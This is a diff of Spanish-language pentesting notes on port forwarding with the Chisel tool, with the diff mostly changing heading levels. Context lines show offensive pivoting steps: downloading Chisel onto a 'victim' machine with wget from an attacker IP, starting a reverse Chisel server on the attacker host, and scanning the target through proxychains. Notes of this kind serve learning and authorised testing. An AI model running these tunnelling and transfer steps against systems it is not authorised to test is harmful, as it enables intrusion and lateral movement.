@@ -9,7 +9,7 @@ Nos permite redirigir todo el trafico entrante de un puerto local hacia un puert
 * **Server -> Windows** 
 * **Cliente -> Kali**
 
-### Forma 1 de descarga
+#### Forma 1 de descarga
 Ingresamos a la pagina para descargarnos 'Chisel'
 ```python 
 ❯ https://github.com/jpillora/chisel > Releases > 'chisel_1.9.1_linux_amd64.gz' 
@@ -17,7 +17,7 @@ Ingresamos a la pagina para descargarnos 'Chisel'
 ❯ chmod +x chisel
 ```
 
-### Forma 2 de descarga
+#### Forma 2 de descarga
 
 1. Podemos clonarlo a nuestra maquina victima 
 ```bash
@@ -36,7 +36,8 @@ Dentro de Chisel
 ❯ wget http://IP/chisel        # Maquina victima 
 ```
 
-3. Lo ejecutamos de la siguiente manera 
+#### Forma de ejecutar el Chisel 
+
 * De esta manera nos podemos traer un puerto especifico
 ```bash
 ❯ ./chisel server --reverse -p 1234                                                 # Server 'Maquina de atacante'
@@ -81,7 +82,6 @@ Forma de verificar y de como debemos de ir colocando los comandos en nuestra maq
 
 ❯ proxychains whatweb ❮Target IP❯     # Escaneo con whatweb a la maquina victima 
 ```
-
 
 ## Dinamic Port Forwarding 
 
